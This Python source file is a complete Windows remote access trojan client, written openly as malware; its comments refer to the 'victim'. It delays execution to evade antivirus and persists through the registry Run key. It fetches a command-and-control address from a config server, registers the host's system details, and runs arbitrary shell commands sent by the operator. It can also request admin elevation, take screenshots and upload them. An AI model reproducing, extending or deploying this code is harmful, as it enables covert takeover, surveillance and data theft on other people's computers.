import os
import sys
import time
import json
import subprocess
import requests
import platform
import ctypes
import base64
import tempfile
import socket
import threading
import psutil
import winreg
from datetime import datetime
import requests
import psutil
#wait to let builtin av chill about new task
time.sleep(180)

CONFIG_SERVER ="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" #use config sever for th main server info
INTERNAL_KEY = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" #set a token 
SERVER_URL = None
AUTH_TOKEN = None
DEVICE_NAME = os.environ.get('COMPUTERNAME', platform.node() or 'Unknown-PC')

def get_system_info():
    info = {}

    try:
        info['hostname'] = platform.node()
        info['os'] = platform.system() + " " + platform.release()
        info['os_version'] = platform.version()
        info['architecture'] = platform.machine()
        info['processor'] = platform.processor()
        info['cpu_count'] = psutil.cpu_count(logical=True)
        info['cpu_physical'] = psutil.cpu_count(logical=False)
        info['cpu_percent'] = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        info['memory_total'] = round(mem.total / (1024 ** 3), 2)
        info['memory_available'] = round(mem.available / (1024 ** 3), 2)
        info['memory_used'] = round(mem.used / (1024 ** 3), 2)
        info['memory_percent'] = mem.percent

        disks = []
        for partition in psutil.disk_partitions():
            try:
                usage = psutil.disk_usage(partition.mountpoint)
                disks.append({
                    'device': partition.device,
                    'mount': partition.mountpoint,
                    'fs': partition.fstype,
                    'total': round(usage.total / (1024 ** 3), 2),
                    'used': round(usage.used / (1024 ** 3), 2),
                    'free': round(usage.free / (1024 ** 3), 2),
                    'percent': usage.percent
                })
            except:
                pass
        info['disks'] = disks

        info['local_ip'] = socket.gethostbyname(socket.gethostname())
        try:
            info['public_ip'] = requests.get('https://api.ipify.org?format=json', timeout=5).json().get('ip')
        except:
            info['public_ip'] = 'Unknown'

        info['username'] = os.getlogin()
        info['user_domain'] = os.environ.get('USERDOMAIN', 'Unknown')

        info['windows_version'] = platform.win32_ver()
        info['boot_time'] = datetime.fromtimestamp(psutil.boot_time()).isoformat()
        info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0

        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            info['windows_product_name'] = winreg.QueryValueEx(key, "ProductName")[0]
            winreg.CloseKey(key)
        except:
            pass

        return info

    except Exception as e:
        return {'error': str(e), 'partial': info if info else {}}

#add to start app using winreg
def add_to_startup():
    try:
        program_name = f"Windowsclient_{os.environ.get('COMPUTERNAME', 'Unknown')}"
        program_path = f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"'
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, program_path)
        winreg.CloseKey(key)

        return True

    except :
        return False


def check_startup():

    try:
        program_name = f"Windowsclient_{os.environ.get('COMPUTERNAME', 'Unknown')}"
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
        try:
            winreg.QueryValueEx(key, program_name)
            winreg.CloseKey(key)
            return True
        except FileNotFoundError:
            winreg.CloseKey(key)
            return False
    except Exception:
        return False
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json().get('ip')
    except:
        try:
            response = requests.get('https://httpbin.org/ip', timeout=5)
            return response.json().get('origin')
        except:
            return None
#if you need admin ask for it :)
def request_admin_privileges():
    try:
        script = os.path.abspath(sys.argv[0])
        params = ' '.join(sys.argv[1:])

        ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            f'"{script}" {params}',
            None,
            1
        )
        return True
    except :
        return False


#to load main server info 
def load_config():
    global SERVER_URL, AUTH_TOKEN

    try:
        response = requests.get(
            CONFIG_SERVER,
            headers={"X-Internal-Key": INTERNAL_KEY},
            timeout=10
        )

        if response.status_code == 200:
            data = response.json()
            SERVER_URL = data.get("SERVER_URL")
            AUTH_TOKEN = data.get("AUTH_TOKEN")

            if not SERVER_URL or not AUTH_TOKEN:
                return False
            return True
        else:
            return False

    except :
        return False


def send_request(endpoint, data, timeout=10):
    if not SERVER_URL:
        return None

    try:
        r = requests.post(
            f"{SERVER_URL}/{endpoint}",
            json=data,
            timeout=timeout
        )
        return r
    except :
        return None



def register_device():
    if not SERVER_URL or not AUTH_TOKEN:
        return False

    system_info = get_system_info()

    r = send_request('register', {
        'token': AUTH_TOKEN,
        'name': DEVICE_NAME,
        'system_info': system_info,
        'public_ip': get_public_ip()
    })

    if r and r.status_code == 200:
        return True
    else:
        return False

#to ping main sever so you know when victim online 
def send_ping():
    if not SERVER_URL or not AUTH_TOKEN:
        return False

    r = send_request('ping', {
        'token': AUTH_TOKEN,
        'name': DEVICE_NAME,
        'cpu': psutil.cpu_percent(),
        'memory': psutil.virtual_memory().percent
    }, timeout=5)

    return r and r.status_code == 200


def get_task():
    if not SERVER_URL or not AUTH_TOKEN:
        return None, None

    r = send_request('get_task', {
        'token': AUTH_TOKEN,
        'name': DEVICE_NAME
    }, timeout=10)

    if r and r.status_code == 200:
        data = r.json()
        if data.get('command'):
            return data['command'], data['task_id']

    return None, None


def send_result(task_id, result):
    if not SERVER_URL or not AUTH_TOKEN:
        return False

    r = send_request('submit_result', {
        'token': AUTH_TOKEN,
        'name': DEVICE_NAME,
        'task_id': task_id,
        'result': result[:2000]
    }, timeout=10)

    return r and r.status_code == 200


def send_file(task_id, file_path, filename):
    try:
        with open(file_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode()

        r = send_request('submit_file', {
            'token': AUTH_TOKEN,
            'name': DEVICE_NAME,
            'task_id': task_id,
            'filename': filename,
            'file_data': file_data
        }, timeout=30)

        if r and r.status_code == 200:
            os.remove(file_path)
            return True
        return False
    except :
        return False


#to execute commends you can edit them or add more it's up to you
def execute_command(cmd):

    if cmd == '!info':
        info = get_system_info()
        return json.dumps(info, indent=2)

    if cmd == '!ss':
        screenshot_path = take_screenshot()
        if screenshot_path:
            return f"[FILE]{screenshot_path}"
        return "❌ Screenshot failed"

    if cmd.startswith('!msg '):
        message = cmd[5:].strip()
        if message.startswith('"') and message.endswith('"'):
            message = message[1:-1]
        show_message_box("Message", message)
        return "✅ Message displayed"

    if cmd == '!admin':
        if request_admin_privileges():
            return "✅ Admin privileges requested. Restart client as admin."
        return "❌ Failed to request admin privileges"

    if cmd == '!ping':
        return "🏓 Pong!"

    interactive_apps = ['notepad', 'calc', 'mspaint', 'explorer', 'cmd', 'winword']

    try:
        if any(app in cmd.lower() for app in interactive_apps):
            subprocess.Popen(cmd, shell=True)
            return f"✅ '{cmd}' started in background"
        else:
            result = subprocess.check_output(
                cmd, shell=True, stderr=subprocess.STDOUT,
                timeout=30, encoding='utf-8', errors='ignore'
            )
            return result if result else "✅ Command executed (no output)"
    except subprocess.TimeoutExpired:
        return "⏰ Timeout (30s)"
    except subprocess.CalledProcessError as e:
        return f"❌ Error {e.returncode}:\n{e.output}"
    except Exception as e:
        return f"❌ Unexpected: {str(e)}"


#to see what is the victim doing in 
def take_screenshot():
    try:
        import mss
        from PIL import Image

        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
            img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)

            temp_file = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            img.save(temp_file, format="PNG")
            return temp_file
    except :
        return None


def show_message_box(title, message):
    try:
        ctypes.windll.user32.MessageBoxW(0, message, title, 0x00000040)
        return True
    except:
        return False


#to reconnect you can edit it and make it less sus
def reconnect():

    time.sleep(0.5)

    if not load_config():
        return False

    if not register_device():
        return False

    return True


#the main thing
def main():

    while not load_config():
        time.sleep(5)

    while not register_device():
        time.sleep(5)


    while True:
        try:
            if not send_ping():
                reconnect()
                continue

            cmd, task_id = get_task()

            if cmd:
                result = execute_command(cmd)
                if isinstance(result, str) and result.startswith('[FILE]'):
                    file_path = result[6:]
                    if os.path.exists(file_path):
                        success = send_file(task_id, file_path, os.path.basename(file_path))
                        if not success:
                            send_result(task_id, "❌ Failed to send file")
                    else:
                        send_result(task_id, "❌ File not found")
                else:
                    send_result(task_id, result[:2000])
            time.sleep(0.5)

        except KeyboardInterrupt:
            pass
        except :
            reconnect()


if not check_startup():
    add_to_startup()
main()

